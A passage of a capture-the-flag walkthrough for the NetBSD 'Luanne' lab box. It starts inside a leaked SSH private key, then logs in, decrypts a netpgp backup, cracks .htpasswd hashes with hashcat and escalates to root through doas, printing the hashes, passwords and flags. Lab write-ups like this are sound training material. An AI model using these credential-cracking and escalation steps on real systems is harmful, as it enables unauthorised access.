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
-----END OPENSSH PRIVATE KEY-----
$ 

```

Now that we have the private SSH key, let's use it to SSH to the target and grab the user flag:

```
└─$ nano user_key

└─$ chmod 600 user_key  

└─$ ssh -i ~/Downloads/luanne/user_key r.michaels@10.10.10.218
Last login: Fri Sep 18 07:06:51 2020
NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020

Welcome to NetBSD!

luanne$ id
uid=1000(r.michaels) gid=100(users) groups=100(users)
luanne$ pwd
/home/r.michaels
luanne$ ls 
backups     devel       public_html user.txt
luanne$ cat user.txt
ea5f0ce6a917b0be1eabc7f9218febc0
luanne$ 
```

We can now see why only the id\_rsa file was visible after authenticating to the web service running on port 3001:&#x20;

```
luanne$ ls -la
total 52
dr-xr-x---  7 r.michaels  users   512 Sep 16  2020 .
drwxr-xr-x  3 root        wheel   512 Sep 14  2020 ..
-rw-r--r--  1 r.michaels  users  1772 Feb 14  2020 .cshrc
drwx------  2 r.michaels  users   512 Sep 14  2020 .gnupg
-rw-r--r--  1 r.michaels  users   431 Feb 14  2020 .login
-rw-r--r--  1 r.michaels  users   265 Feb 14  2020 .logout
-rw-r--r--  1 r.michaels  users  1498 Feb 14  2020 .profile
-rw-r--r--  1 r.michaels  users   166 Feb 14  2020 .shrc
dr-x------  2 r.michaels  users   512 Sep 16  2020 .ssh
dr-xr-xr-x  2 r.michaels  users   512 Nov 24  2020 backups
dr-xr-x---  4 r.michaels  users   512 Sep 16  2020 devel
dr-x------  2 r.michaels  users   512 Sep 16  2020 public_html
-r--------  1 r.michaels  users    33 Sep 16  2020 user.txt
luanne$ ls -la public_html/                                                                                      
total 20
dr-x------  2 r.michaels  users   512 Sep 16  2020 .
dr-xr-x---  7 r.michaels  users   512 Sep 16  2020 ..
-r--r--r--  1 root        users    47 Sep 16  2020 .htpasswd
-r--------  1 r.michaels  users  2610 Sep 16  2020 id_rsa
luanne$ cat public_html/.htpasswd                                                                                
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
luanne$ 
```

## Enumeration as "r.michaels"

Let's check for binaries with the SUID bit set:

```
luanne$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/at
/usr/bin/atq
/usr/bin/atrm
/usr/bin/batch
/usr/bin/chfn
/usr/bin/chpass
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/lock
/usr/bin/login
/usr/bin/lpq
/usr/bin/lpr
/usr/bin/lprm
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/rlogin
/usr/bin/skeyinfo
/usr/bin/skeyinit
/usr/bin/su
/usr/bin/yppasswd
/usr/libexec/mail.local
/usr/libexec/ssh-keysign
/usr/libexec/utmp_update
/usr/sbin/authpf
/usr/sbin/mrinfo
/usr/sbin/mtrace
/usr/sbin/pppd
/usr/sbin/sliplogin
/usr/sbin/traceroute
/usr/sbin/traceroute6
/usr/pkg/bin/doas
/usr/pkg/libexec/dbus-daemon-launch-helper
/bin/rcmd
/sbin/ping
/sbin/ping6
/sbin/shutdown
luanne$ 
```

The "doas" binary is the BSD equivalent of "sudo" in Linux. Looking at the man page, we see that the configuration is stored in the "/etc/doas.conf" file.&#x20;

{% embed url="https://man.openbsd.org/doas" %}

Let's see if we can find it and view it to see what commands we can run as root:

```
luanne$ cat /etc/doas.conf
cat: /etc/doas.conf: No such file or directory
luanne$ find / -name "doas.conf" 2>/dev/null
/usr/pkg/etc/doas.conf
luanne$ cat /usr/pkg/etc/doas.conf
permit r.michaels as root
luanne$ 
```

Comparing the output above to the man page for "doas.conf", we can see that the user "r.michaels" can run any command as root:

{% embed url="https://man.openbsd.org/doas.conf.5" %}

```
luanne$ doas -u root /bin/sh
Password:
doas: authentication failed
luanne$ 
```

Unfortunately, we don't have the password for the user, and so we should see if we can find out what it is.

## Privilege Escalation

In the home directory there is a "backups" directory that contains the following file:

```
luanne$ ls -la
total 52
dr-xr-x---  7 r.michaels  users   512 Sep 16  2020 .
drwxr-xr-x  3 root        wheel   512 Sep 14  2020 ..
-rw-r--r--  1 r.michaels  users  1772 Feb 14  2020 .cshrc
drwx------  2 r.michaels  users   512 Sep 14  2020 .gnupg
-rw-r--r--  1 r.michaels  users   431 Feb 14  2020 .login
-rw-r--r--  1 r.michaels  users   265 Feb 14  2020 .logout
-rw-r--r--  1 r.michaels  users  1498 Feb 14  2020 .profile
-rw-r--r--  1 r.michaels  users   166 Feb 14  2020 .shrc
dr-x------  2 r.michaels  users   512 Sep 16  2020 .ssh
dr-xr-xr-x  2 r.michaels  users   512 Nov 24  2020 backups
dr-xr-x---  4 r.michaels  users   512 Sep 16  2020 devel
dr-x------  2 r.michaels  users   512 Sep 16  2020 public_html
-r--------  1 r.michaels  users    33 Sep 16  2020 user.txt
luanne$ ls -la backups/                                                                                          
total 12
dr-xr-xr-x  2 r.michaels  users   512 Nov 24  2020 .
dr-xr-x---  7 r.michaels  users   512 Sep 16  2020 ..
-r--------  1 r.michaels  users  1970 Nov 24  2020 devel_backup-2020-09-16.tar.gz.enc
luanne$ 
```

A google search for "netbsd enc file" finds the following page:

{% embed url="https://man.netbsd.org/netpgp.1" %}

Reading through the man page, we see that we can encrypt and decrypt files using the "netpgp" command. Let's give it a shot:

```
luanne$ which netpgp
/usr/bin/netpgp
luanne$ netpgp --decrypt backups/devel_backup-2020-09-16.tar.gz.enc --output=bak.tar.gz 
bak.tar.gz: Permission denied
bak.tar.gz: Permission denied
luanne$ ls -la /home
total 12
drwxr-xr-x   3 root        wheel  512 Sep 14  2020 .
drwxr-xr-x  21 root        wheel  512 Sep 16  2020 ..
dr-xr-x---   7 r.michaels  users  512 Sep 16  2020 r.michaels
luanne$ 
```

We don't have write access to the "home" directory, so we'll need to save the decrypted file somewhere else.

```
luanne$ netpgp --decrypt backups/devel_backup-2020-09-16.tar.gz.enc --output=/tmp/bak.tar.gz 
signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
uid              RSA 2048-bit key <r.michaels@localhost>
luanne$ ls -la /tmp 
total 20
drwxrwxrwt   2 root        wheel    48 Nov 22 17:38 .
drwxr-xr-x  21 root        wheel   512 Sep 16  2020 ..
-rw-------   1 r.michaels  wheel  1639 Nov 22 17:38 bak.tar.gz
luanne$
```

Let's extract the archive and have a look at the contents:

```
luanne$ tar xzvf /tmp/bak.tar.gz                                                             
x devel-2020-09-16/
x devel-2020-09-16/www/
x devel-2020-09-16/webapi/
x devel-2020-09-16/webapi/weather.lua
x devel-2020-09-16/www/index.html
x devel-2020-09-16/www/.htpasswd
luanne$ ls -la
total 28
drwxrwxrwt   3 root        wheel    96 Nov 22 17:40 .
drwxr-xr-x  21 root        wheel   512 Sep 16  2020 ..
-rw-------   1 r.michaels  wheel  1639 Nov 22 17:39 bak.tar.gz
drwxr-x---   4 r.michaels  wheel    96 Sep 16  2020 devel-2020-09-16
luanne$ cd devel-2020-09-16/                                                                                     
luanne$ ls -la
total 32
drwxr-x---  4 r.michaels  wheel  96 Sep 16  2020 .
drwxrwxrwt  3 root        wheel  96 Nov 22 17:40 ..
drwxr-xr-x  2 r.michaels  wheel  48 Sep 16  2020 webapi
drwxr-xr-x  2 r.michaels  wheel  96 Sep 16  2020 www
luanne$ cd webapi
luanne$ ls -la
total 32
drwxr-xr-x  2 r.michaels  wheel    48 Sep 16  2020 .
drwxr-x---  4 r.michaels  wheel    96 Sep 16  2020 ..
-rw-r--r--  1 r.michaels  wheel  7072 Sep 16  2020 weather.lua
luanne$ cd ..
luanne$ cd www
luanne$ ls -la
total 32
drwxr-xr-x  2 r.michaels  wheel   96 Sep 16  2020 .
drwxr-x---  4 r.michaels  wheel   96 Sep 16  2020 ..
-rw-r--r--  1 r.michaels  wheel   47 Sep 16  2020 .htpasswd
-rw-r--r--  1 r.michaels  wheel  378 Sep 16  2020 index.html
luanne$ cat .htpasswd                                                                                            
webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
luanne$ cat /home/r.michaels/devel/www/.htpasswd                                                                 
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
luanne$ 
```

There is backups of the webapp files, including the ".htaccess" file. We can compare it to the ".htaccess" file in the users' home directory and as shown above, it's different. Let's crack it with hashcat:

```
└─$ hashcat -a 0 -m 500 hash.txt /usr/share/wordlists/rockyou.txt                                             2 ⚙
hashcat (v6.1.1) starting...
...
└─$ hashcat -a 0 -m 500 hash.txt --show                                                                       2 ⚙
$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0:iamthebest
$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.:littlebear
                                                
```

After just a few seconds, the second hash is cracked. Let's see if this is the password for our user:

```
luanne$ doas -u root /bin/sh
Password:
sh: Cannot determine current working directory
# id
uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)
# cd /root
# cat root.txt
7a9b5c206e8e8ba09bb99bd113675f66
# 
```

We can run any command as root, so getting a shell as root is trivial, and we can grab the root flag to complete the box.

## Resources

{% embed url="https://man.netbsd.org/NetBSD-1.6/ps.1" %}







